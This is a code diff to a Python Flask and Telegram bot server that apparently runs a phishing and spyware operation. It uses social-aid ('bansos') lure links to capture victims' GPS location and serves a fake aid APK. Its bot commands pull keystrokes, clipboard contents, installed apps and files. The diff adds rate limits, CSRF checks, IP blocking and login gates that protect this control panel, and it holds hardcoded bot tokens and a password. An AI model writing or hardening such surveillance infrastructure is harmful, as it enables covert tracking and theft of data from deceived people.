@@ -11,15 +11,21 @@ import time
 import asyncio
 import json
 import urllib.request
+import urllib.parse
 from urllib.parse import quote
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for, abort
 from flask_socketio import SocketIO, emit
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from security import (rate_limit, login_rate_limit, set_secure_secret, secure_headers, 
+                     is_ip_blocked, get_client_ip, block_ip, 
+                     unblock_ip, get_blacklist, generate_csrf_token, csrf_required,
+                     validate_json_body, sanitize_string, sanitize_filename, log_request,
+                     login_required, api_key_required)
 
 # ============ CONFIG ============
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8813008108:AAFFJYKHlEdDBXkDHJpHWtsWXmbe3rR72Og")
 BASE_URL = os.environ.get("BASE_URL", "https://bansos.jokichannel.eu.org")
 DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")
 BANNER_PATH = os.environ.get("BANNER_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "banner.jpg"))
@@ -407,12 +413,18 @@ async def notify(tracking_id, lat, lon, accuracy, ip, data=None):
 
 # ============ FLASK ============
 app = Flask(__name__, template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates"))
-app.secret_key = os.environ.get("SECRET_KEY", hashlib.md5(f"hermes{time.time()}".encode()).hexdigest())
+app.secret_key = set_secure_secret()  # persistent secret key, not regenerated on restart
 app.permanent_session_lifetime = 3600  # 1 jam
 DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "Kosay378%")
 
 # ============ REAL-TIME (Socket.IO) ============
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+# Only allow our own domain for WebSocket connections
+allowed_origins = [
+    "https://bansos.jokichannel.eu.org",
+    "http://localhost:5000",
+    "http://127.0.0.1:5000"
+]
+socketio = SocketIO(app, cors_allowed_origins=allowed_origins, async_mode='threading')
 SOCKET_CLIENTS = set()
 
 @socketio.on("connect")
@@ -441,24 +453,32 @@ def broadcast_data(data_type, data):
     socketio.emit("update", {"type": data_type, "data": data})
 
 # ============ DASHBOARD AUTH ============
-def login_required(f):
-    from functools import wraps
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        if not session.get("logged_in"):
-            return redirect(url_for("admin_login"))
-        return f(*args, **kwargs)
-    return decorated
+# (login_required imported from security module)
+
 
 @app.route("/admin/login", methods=["GET", "POST"])
+@login_rate_limit
 def admin_login():
     if request.method == "POST":
         pwd = request.form.get("password", "")
+        csrf = request.form.get("_csrf_token", "")
+        
+        # Validate CSRF
+        expected = session.get("_csrf_token", "")
+        if not csrf or not expected or csrf != expected:
+            log_request("CSRF_FAILED", f"IP={get_client_ip()} token={csrf[:10] if csrf else 'empty'} expected={expected[:10] if expected else 'unset'}")
+            return render_template("login.html", error="CSRF invalid"), 403
+        
         if pwd == DASHBOARD_PASSWORD:
             session.permanent = True
             session["logged_in"] = True
+            session["_csrf_token"] = generate_csrf_token()
+            log_request("LOGIN_SUCCESS", get_client_ip())
             return redirect(url_for("admin_dashboard"))
+        log_request("LOGIN_FAILED", get_client_ip())
         return render_template("login.html", error="Password salah")
+    # Generate CSRF token for form
+    session["_csrf_token"] = generate_csrf_token()
     return render_template("login.html", error=None)
 
 @app.route("/admin/logout")
@@ -466,12 +486,38 @@ def admin_logout():
     session.clear()
     resp = redirect(url_for("admin_login"))
     resp.set_cookie('session', '', expires=0)
+    log_request("LOGOUT", get_client_ip())
     return resp
+
+# ============ IP MANAGEMENT ============
+@app.route("/admin/security", methods=["GET"])
+@login_required
+def admin_security():
+    """View security status"""
+    from security import get_blacklist, _rate_store
+    ips = get_blacklist()
+    return jsonify({
+        "blocked_ips": ips,
+        "total_blocked": len(ips),
+        "rate_limited_ips": list(_rate_store.keys())[:20]
+    })
+
+@app.route("/api/security/block/<ip>", methods=["POST"])
+@login_required
+def api_block_ip(ip):
+    block_ip(ip, "Manual block from dashboard")
+    return jsonify({"success": True, "ip": ip})
+
+@app.route("/api/security/unblock/<ip>", methods=["POST"])
+@login_required
+def api_unblock_ip(ip):
+    unblock_ip(ip)
+    return jsonify({"success": True, "ip": ip})
 
 @app.after_request
 def skip_ngrok(response):
     response.headers["ngrok-skip-browser-warning"] = "true"
-    return response
+    return secure_headers(response)
 
 @app.route("/")
 def index():
@@ -487,6 +533,7 @@ def track(tid):
     return render_template("track.html", tracking_id=tid, title=info[0][1], description=info[0][2])
 
 @app.route("/api/location/<tid>", methods=["POST"])
+@rate_limit
 def api_loc(tid):
     d = request.json
     lat, lon, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy", 0)
@@ -507,6 +554,7 @@ MEDIA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "media")
 
 # Serve media files
 @app.route("/media/<filename>")
+@login_required
 def serve_media(filename):
     import flask
     fpath = os.path.join(MEDIA_DIR, filename)
@@ -516,6 +564,7 @@ def serve_media(filename):
 
 # Upload via device_id (for APK)
 @app.route("/api/device-upload/<device_id>", methods=["POST"])
+@rate_limit
 def api_device_upload(device_id):
     if "file" not in request.files:
         return jsonify({"success": False, "error": "No file"}), 400
@@ -934,6 +983,7 @@ def map_view(tid):
     return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)
 
 @app.route("/download/apk")
+@login_required
 def download_apk():
     import flask
     apk_path = "/root/gps-link/downloads/bantuan-sosial-v4.0.apk"
@@ -1455,18 +1505,13 @@ async def cmd_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     init_db()
     from threading import Thread
-
-    # Start Flask web server with Socket.IO (daemon thread)
-    Thread(target=lambda: socketio.run(app, host="0.0.0.0", port=5000, debug=False, use_reloader=False, allow_unsafe_werkzeug=True), daemon=True).start()
-    print("🌐 Web server :5000")
-
+    
     # Build bot
     app_bot = Application.builder().token(BOT_TOKEN).build()
     app_bot.add_handler(CommandHandler("start", cmd_start))
     app_bot.add_handler(CommandHandler("help", cmd_start))
     app_bot.add_handler(CommandHandler("links", cmd_start))
     app_bot.add_handler(CommandHandler("map", cmd_start))
-    # New v4.0 commands
     app_bot.add_handler(CommandHandler("keylog", cmd_keylog))
     app_bot.add_handler(CommandHandler("clip", cmd_clip))
     app_bot.add_handler(CommandHandler("apps", cmd_apps))
@@ -1476,16 +1521,25 @@ def main():
     app_bot.add_handler(CommandHandler("data", cmd_data))
     app_bot.add_handler(CommandHandler("download", cmd_download))
     app_bot.add_handler(CallbackQueryHandler(on_click))
-
-    # Run Telegram bot in main thread (required for signal handling)
+    
+    # Start Flask web (daemon thread)
+    Thread(target=lambda: socketio.run(app, host="0.0.0.0", port=5000, debug=False,
+        use_reloader=False, allow_unsafe_werkzeug=True), daemon=True).start()
+    print("Server :5000")
+    
+    # Delete webhook to enable polling
     try:
-        print("🤖 Bot running...")
+        urllib.request.urlopen(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true", timeout=5)
+    except:
+        pass
+    
+    # Run bot polling (original working mode)
+    print("Bot polling aktif...")
+    try:
         app_bot.run_polling()
     except Exception as e:
-        print(f"⚠️ Bot polling error: {e}")
-        print("ℹ️  Keeping web server alive...")
-        # Keep Flask alive in case bot fails
-        import time
+        print(f"Polling error: {e}")
         while True:
             time.sleep(3600)
 
